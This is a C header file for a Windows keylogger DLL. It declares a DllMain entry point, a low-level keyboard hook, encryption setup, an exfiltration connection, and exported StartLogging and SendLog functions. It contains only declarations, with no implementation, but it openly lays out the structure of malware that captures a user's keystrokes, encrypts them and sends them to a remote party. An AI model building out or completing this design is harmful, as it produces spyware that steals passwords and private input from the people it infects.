/**************************************************************************************************** 
* Keylogger header for function and DLL exports declarations
* Compile with Keylogger.c as a DLL
****************************************************************************************************/

#pragma once
#include <Windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
DWORD __declspec(dllexport) StartLogging();
DWORD InitCrypto();
INT InitExfilConn();
DWORD SetHook();
LRESULT CALLBACK LowLevelKeyboardHook(INT nCode, WPARAM wParam, LPARAM lParam);
VOID RemoveHook();
DWORD __declspec(dllexport) SendLog();
VOID Cleanup();
VOID CleanCrypto();
VOID CleanExfilConn();